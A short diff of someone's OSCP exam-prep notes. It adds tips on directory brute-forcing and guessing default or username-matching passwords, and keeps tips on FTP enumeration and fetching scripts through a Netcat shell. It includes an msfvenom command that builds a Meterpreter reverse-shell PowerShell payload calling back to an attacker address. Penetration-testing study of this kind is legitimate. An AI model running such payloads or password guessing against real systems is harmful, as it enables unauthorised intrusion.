@@ -8,6 +8,8 @@ description: Just some rough notes in preparation for the OSCP.
 
 * Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
 * When enumerating FTP, ensure you run `dir -a` to enumerate any hidden files or directories on the system. You may find l00t!
+* Ensure you run FeroxBuster or GoBuster with file extensions identified throughout inital enumeration of the device.
+* Always try to login with default passwords and with using the username as a password. For example, if a username has been identiifed as `parzival` try and login with the password `parzival`
 * If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
   * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`
 * Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
